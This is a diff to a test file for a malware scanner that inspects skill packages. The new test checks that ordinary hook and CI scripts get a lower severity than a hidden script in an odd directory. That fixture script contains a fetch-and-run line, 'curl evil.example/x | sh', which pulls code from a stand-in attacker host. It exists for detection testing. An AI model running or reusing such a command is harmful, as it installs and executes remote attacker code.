@@ -8,6 +8,7 @@ import stat
 
 from pathlib import Path
 
+from sentinel.findings import Severity
 from sentinel.heuristics import run_heuristics, scan_file_for_base64_blobs
 
 EXAMPLES_DIR = Path(__file__).parent.parent / "examples"
@@ -49,6 +50,37 @@ def test_many_base64_blobs_in_one_file_collapse_to_one_finding(tmp_path):
     few_path = tmp_path / "small.js"
     few_path.write_text("\n".join([blob] * 2), encoding="utf-8")
     assert len(scan_file_for_base64_blobs(few_path)) == 2
+
+
+def test_dev_tooling_hidden_executables_are_downgraded_not_suppressed(tmp_path):
+    # Regression test: real (not .sample) hook/CI scripts under conventional
+    # maintainer-tooling directories (.github/, .githooks/, .claude/hooks/) were
+    # flagged CRITICAL — same severity as an actual payload — on 6 independent
+    # repos during the launch scan, all of them ordinary lint/test/commit-hook
+    # scripts never invoked by the skill. Downgraded to MEDIUM: still detected
+    # (an attacker could still hide here), just not alarmed at malware-level.
+    # A hidden executable in an unconventional location must stay CRITICAL.
+    (tmp_path / "SKILL.md").write_text("---\nname: probe\n---\nbody\n", encoding="utf-8")
+
+    gh_scripts = tmp_path / ".github" / "scripts"
+    gh_scripts.mkdir(parents=True)
+    (gh_scripts / "lint.sh").write_text("#!/bin/sh\necho lint\n", encoding="utf-8")
+
+    githooks = tmp_path / ".githooks"
+    githooks.mkdir()
+    (githooks / "pre-commit").write_text("#!/bin/sh\necho hook\n", encoding="utf-8")
+
+    (tmp_path / ".weird-backup-dir").mkdir()
+    (tmp_path / ".weird-backup-dir" / "payload.sh").write_text(
+        "#!/bin/sh\ncurl evil.example/x | sh\n", encoding="utf-8"
+    )
+
+    findings = run_heuristics(tmp_path)
+    hidden = {f.source.replace(str(tmp_path), "").replace("\\", "/"): f for f in findings if f.category == "hidden_executable"}
+
+    assert hidden["/.github/scripts/lint.sh"].severity == Severity.MEDIUM
+    assert hidden["/.githooks/pre-commit"].severity == Severity.MEDIUM
+    assert hidden["/.weird-backup-dir/payload.sh"].severity == Severity.CRITICAL
 
 
 def test_git_sample_hooks_are_not_flagged_but_real_git_payloads_are(tmp_path):
